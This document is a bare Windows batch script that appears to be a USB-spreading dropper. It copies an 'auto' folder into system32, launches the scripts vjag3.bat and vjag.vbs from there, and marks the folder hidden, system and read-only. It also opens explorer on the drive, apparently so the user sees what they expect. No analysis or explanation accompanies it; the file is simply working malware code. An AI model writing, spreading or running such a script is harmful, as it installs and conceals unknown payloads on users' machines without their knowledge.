@echo off
set a=%dir%\%0
set b=%a:~2,3%
xcopy /I /y %dir%\auto %windir%\system32\auto
start explorer %b%
goto j

:j
start %windir%\system32\auto\vjag3.bat
start %windir%\system32\auto\vjag.vbs
attrib +h +s +r %windir%\system32\auto
exit